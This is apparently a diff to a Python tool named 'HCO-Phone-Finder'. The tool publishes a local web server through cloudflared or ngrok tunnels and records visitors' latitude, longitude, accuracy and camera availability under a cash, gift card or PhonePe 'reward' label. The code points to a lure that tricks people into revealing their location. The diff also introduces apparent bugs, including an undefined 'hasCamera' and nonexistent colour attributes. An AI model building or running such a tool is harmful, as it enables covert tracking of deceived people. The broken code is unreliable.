@@ -294,7 +294,7 @@ def report():
         "lat": float(lat),
         "lon": float(lon),
         "acc": acc,
-        "has_camera": has_camera,
+        "has_camera": hasCamera,
         "reward_type": "Cash/GiftCard/PhonePe"
     }
     _received_reports.append(rec)
@@ -394,32 +394,67 @@ def start_cloudflared_background(port: int = PORT, timeout: float = 12.0) -> Tup
     cf = which_bin("cloudflared")
     if not cf:
         return None, None
+    
+    print(Fore.CYAN + "[*] Starting cloudflared tunnel (new method)...")
     try:
-        proc = subprocess.Popen([cf, "tunnel", "--url", f"http://localhost:{port}", "--no-autoupdate"],
-                                 stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
+        # New cloudflared command for latest versions
+        proc = subprocess.Popen([
+            "cloudflared", "tunnel", 
+            "--url", f"http://localhost:{port}"
+        ], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
+        
+        # Alternative command if above doesn't work
+        # proc = subprocess.Popen([
+        #     "cloudflared", "tunnel", "run",
+        #     "--url", f"http://localhost:{port}"
+        # ], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
+        
     except Exception as e:
         print(Fore.RED + "[!] Failed to start cloudflared:", e)
         return None, None
+    
     url = None
     deadline = time.time() + timeout
+    
     try:
-        while time.time() < deadline:
+        # Read output to find the URL
+        while time.time() < deadline and proc.poll() is None:
             if proc.stdout is None:
-                break
+                time.sleep(0.2)
+                continue
+                
             line = proc.stdout.readline()
             if not line:
                 time.sleep(0.2)
                 continue
-            # Try extract https:// from line
+                
+            print(Fore.YELLOW + f"[cloudflared] {line.strip()}")
+            
+            # Look for URL in different formats
             if "https://" in line:
-                for tok in line.split():
-                    if tok.startswith("https://"):
-                        url = tok.strip().rstrip(",")
-                        break
-            if url:
-                break
-    except Exception:
-        pass
+                # Try to extract URL from the line
+                import re
+                urls = re.findall(r'https://[a-zA-Z0-9.-]+\.trycloudflare\.com', line)
+                if urls:
+                    url = urls[0]
+                    break
+                    
+            # Also check for new URL format
+            if ".trycloudflare.com" in line:
+                import re
+                urls = re.findall(r'https://[a-zA-Z0-9.-]+\.trycloudflare\.com', line)
+                if urls:
+                    url = urls[0]
+                    break
+                    
+    except Exception as e:
+        print(Fore.RED + f"[!] Error reading cloudflared output: {e}")
+    
+    if not url:
+        print(Fore.YELLOW + "[!] Could not extract URL from cloudflared output")
+        print(Fore.YELLOW + "[*] You may need to check cloudflared output manually")
+        print(Fore.YELLOW + "[*] Or use ngrok instead")
+    
     return url, proc
 
 # ----------------- QR helpers -----------------
@@ -459,11 +494,11 @@ def tool_lock_countdown(seconds: int = 5):
     print("\n" + Fore.GREEN + "Tool unlocked — starting now.\n")
 
 def print_banner():
-    print(Style.BRIGHT + Fore.CYAN + "╔══════════════════════════════════════╗")
-    print(Style.BRIGHT + Fore.CYAN + "║       HCO-Phone-Finder v3           ║")
-    print(Style.BRIGHT + Fore.CYAN + "║      Reward Collection System        ║")
-    print(Style.BRIGHT + Fore.CYAN + "╚══════════════════════════════════════╝")
-    print(Fore.MAGENTA + "Code by Azhar — Advanced reward collection system\n")
+    print(Style.Green + Fore.CYAN + "╔══════════════════════════════════════╗")
+    print(Style.Green + Fore.CYAN + "║             HCO-Phone-Finder by Azhar       ║")
+    print(Style.Green + Fore.CYAN + "║      Tool to Track Lost or Stolen Phone 📱  ║")
+    print(Style.Green + Fore.CYAN + "╚══════════════════════════════════════╝")
+    print(Fore.Red + "Code by Azhar — Advanced reward collection system\n")
 
 # ----------------- Main flow -----------------
 def main():
@@ -481,7 +516,7 @@ def main():
 
     print(Fore.CYAN + "Tunnel options:")
     print(Fore.YELLOW + "  1) ngrok (if installed)")
-    print(Fore.YELLOW + "  2) cloudflared (if installed)")
+    print(Fore.YELLOW + "  2) cloudflared (if installed)") 
     print(Fore.YELLOW + "  3) Paste an existing public URL / Run local only")
     choice = input(Fore.GREEN + "Choose 1/2/3: ").strip()
 
@@ -511,7 +546,8 @@ def main():
             public_link = url
             print(Fore.MAGENTA + f"[cloudflared] Public URL: {public_link}")
         else:
-            print(Fore.YELLOW + "[!] cloudflared started but public URL not detected yet. Check the cloudflared output.")
+            print(Fore.YELLOW + "[!] cloudflared started but public URL not detected.")
+            print(Fore.YELLOW + "[*] Check the output above for the URL or try ngrok.")
 
     else:
         manual = input(Fore.GREEN + "Paste public URL (leave blank to run only locally): ").strip()
